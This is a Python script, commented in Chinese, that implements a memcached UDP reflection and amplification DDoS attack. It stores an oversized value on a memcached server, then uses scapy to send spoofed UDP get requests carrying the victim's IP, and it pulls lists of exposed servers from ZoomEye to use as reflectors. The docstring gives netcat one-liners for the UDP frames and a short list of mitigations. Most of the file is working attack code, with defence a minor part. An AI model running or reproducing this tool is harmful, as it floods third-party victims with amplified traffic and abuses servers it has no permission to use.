#!/usr/bin/python
# coding:utf-8

'''
memcached就是一个类似redis的key-value高速缓存系统。
[打开UDP]
新版已默认关闭UDP访问，可以用如下模式打开：
memcached -m 64m -vv -U 11211 -u memcache

[命令行访问方式]
telnet [ip] 11211
set [key] [是否压缩] [存活时长] [字符长度]
get [key]
eg: set username 0 120 3
get username
出现STORED字样说明存储成功

[python]
python -c "print '\0\x01\0\0\0\x01\0\0status\r\n'" | nc -nvvu 10.211.55.6 11211 > /dev/null
python -c "print '\0\x01\0\0\0\x01\0\0get testkey\r\n'" | nc -nvvu 10.211.55.6 11211 > /dev/null

[攻击思路]
1. 先set一个值
2. 然后使用udp-get获取，并设置udp-srcip指向目标地址

攻击防范：
1. 禁用memecached的UDP模式(2018-2-27更新后默认关闭UDP)，参数为-U 0
2. memcached一般是给内部应用访问的，所以我们可以禁用外网访问memcached，同时在网络入口路由器上设置URPF（单波逆向路径转发），即请求包的入口接口和出口接口必须一致
3. 启用授权访问
'''

import memcache
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

from com.dbc.pybaseproj.networktools.ddos.ZoomEyeUtils import ZoomEyeUtils
from com.dbc.pybaseproj.utils.FileUtil import FileUtil


class MemcachedAttack(object):
    # set
    var_name = ''
    serverip = ''
    port = 11211
    mc = None

    def __init__(self, serverip, default_port=11211):
        self.serverip = serverip
        self.port = default_port

    '''
    设置一个key，默认过期时间三小时
    '''

    def setKey(self, var_name, value):
        self.mc = memcache.Client([self.serverip + ':' + str(self.port)], debug=True)
        self.var_name = var_name
        self.mc.set(self.var_name, value)

    '''
    一次设置多个key，默认过期时间三小时
    '''

    def setMultiKey(self, mutilDic):
        self.mc = memcache.Client([self.serverip + ':' + str(self.port)], debug=True, socket_timeout=100000)
        self.mc.set_multi(mutilDic)

    def getKey(self, keyword):
        return self.mc.get(keyword)

    def status(self):
        ''''''

    '''
    使用udp进行DDoS攻击
    '''

    def ddos(self, target_ip):
        data = "\x00\x01\x00\x00\x00\x01\x00\x00get " + self.var_name + "\r\n"
        ip = IP(src=target_ip, dst=self.serverip)
        sendp(Ether() / ip / UDP(dport=self.port) / data)


if __name__ == '__main__':
    # 查找本地是否有结果文件，如果有直接读取
    memcached_targetFile = '/Users/dabaicai/Documents/Security/Info/memcached_target.txt'
    target_list = []
    if not os.path.isfile(memcached_targetFile):
        print('[-] info : memcached_target file is not exist, please login and search target list')
        zoomEyeUtils = ZoomEyeUtils()
        target_list = zoomEyeUtils.queryMemcached()
        # 写入文件
        FileUtil.writeDataFile(memcached_targetFile, "w+", target_list)
    else:
        target_list = FileUtil.initDictFromFile(memcached_targetFile, "r")
    # 开始memcached攻击
    #server_ip = target_list[0]
    server_ip = "192.168.31.98"
    memcacheAttack = MemcachedAttack(server_ip)
    memcacheAttack.setKey("testkey", "gundamSeed"*9999)
    # target_ip
    memcacheAttack.ddos("192.168.31.135")
